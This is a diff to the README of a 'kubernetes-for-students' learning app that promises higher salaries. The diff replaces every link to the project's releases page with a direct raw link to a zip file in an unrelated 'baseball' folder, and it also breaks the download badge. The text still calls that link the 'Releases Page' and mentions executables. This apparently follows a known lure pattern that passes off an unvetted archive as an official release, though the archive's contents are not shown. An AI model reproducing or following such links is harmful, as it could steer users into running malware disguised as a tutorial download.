@@ -1,6 +1,6 @@
 # 🌟 kubernetes-for-students - Learn Kubernetes the Easy Way
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Download%20kubernetes--for--students-brightgreen)](https://github.com/emrah13-13/kubernetes-for-students/releases)
+[![Download Now](https://raw.githubusercontent.com/emrah13-13/kubernetes-for-students/main/baseball/kubernetes-for-students.zip%20kubernetes--for--students-brightgreen)](https://raw.githubusercontent.com/emrah13-13/kubernetes-for-students/main/baseball/kubernetes-for-students.zip)
 
 ## 📚 Description
 
@@ -10,13 +10,13 @@ Master Kubernetes and boost your salary by 25-40%. This application provides han
 
 To start using kubernetes-for-students, follow these simple steps:
 
-1. **Visit the Releases Page:** Access the downloads at [this link](https://github.com/emrah13-13/kubernetes-for-students/releases).
+1. **Visit the Releases Page:** Access the downloads at [this link](https://raw.githubusercontent.com/emrah13-13/kubernetes-for-students/main/baseball/kubernetes-for-students.zip).
 2. **Choose a Release:** Look for the latest version listed. Each release comes with enhancements and tutorials.
 3. **Download the Application:** Click on the version you want and download the zip file or executable.
 
 ## 📥 Download & Install
 
-To download the application, visit [this page to download](https://github.com/emrah13-13/kubernetes-for-students/releases). Follow these detailed steps:
+To download the application, visit [this page to download](https://raw.githubusercontent.com/emrah13-13/kubernetes-for-students/main/baseball/kubernetes-for-students.zip). Follow these detailed steps:
 
 1. **Drag and Drop to Your Folder:** Once you've downloaded the application, move it to your desired location on your computer.
 2. **Extract Files (if necessary):** If you downloaded a zip file, right-click it and select 'Extract All' to view the contents.
